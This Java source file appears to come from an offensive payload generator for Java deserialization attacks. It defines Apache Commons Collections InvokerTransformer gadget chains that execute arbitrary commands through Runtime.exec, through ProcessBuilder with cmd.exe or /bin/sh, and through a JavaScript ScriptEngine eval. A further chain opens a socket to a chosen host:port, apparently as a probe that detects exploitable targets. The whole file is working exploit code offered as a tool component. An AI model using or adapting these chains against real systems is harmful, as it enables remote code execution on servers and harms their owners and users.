package com.ppp.sinks;

import com.ppp.Printer;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import java.net.Socket;

/**
 * @author Whoopsunix
 */
@Sink({Sink.InvokerTransformer3})
public class InvokerTransformer3 {
    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
    public Transformer[] runtime(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();

        return new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{command}),
                new ConstantTransformer(1)};
    }

    /**
     * 命令执行 ProcessBuilder
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.ProcessBuilder})
    public Transformer[] processBuilder(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();
        String os = sinksHelper.getOs();

        Transformer[] transformers = new Transformer[0];
        if (os != null && os.toLowerCase().contains(EnchantType.WIN)) {
            transformers = new Transformer[]{
                    new ConstantTransformer(ProcessBuilder.class),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{
                            Class[].class}, new Object[]{new Class[]{String[].class}}),
                    new InvokerTransformer("newInstance", new Class[]{
                            Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
                    new InvokerTransformer("start", new Class[]{}, new Object[]{}),
                    new ConstantTransformer(1)};
        } else {
            transformers = new Transformer[]{
                    new ConstantTransformer(ProcessBuilder.class),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{
                            Class[].class}, new Object[]{new Class[]{String[].class}}),
                    new InvokerTransformer("newInstance", new Class[]{
                            Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
                    new InvokerTransformer("start", new Class[]{}, new Object[]{}),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }

    /**
     * ScriptEngine
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.ScriptEngine})
    public Transformer[] scriptEngine(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();
        String code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);

        return new Transformer[]{
                new ConstantTransformer(ScriptEngineManager.class),
                new InstantiateTransformer(new Class[]{}, new Object[]{}),
                new InvokerTransformer("getEngineByName", new Class[]{
                        String.class}, new Object[]{"JavaScript"}),
                new InvokerTransformer("eval", new Class[]{
                        String.class}, new Object[]{code}),
                new ConstantTransformer(1)};
    }

    /**
     * Socket 探测
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Socket})
    public Transformer[] socket(SinksHelper sinksHelper) {
        String thost = sinksHelper.getHost();

        String[] hostSplit = thost.split("[:]");

        String host = hostSplit[0];
        int port = 80;

        if (hostSplit.length == 2)
            port = Integer.parseInt(hostSplit[1]);

        return new Transformer[]{
                new ConstantTransformer(Socket.class),
                new InstantiateTransformer(new Class[]{String.class, int.class}, new Object[]{host, port}),
                new ConstantTransformer(1)};
    }


}
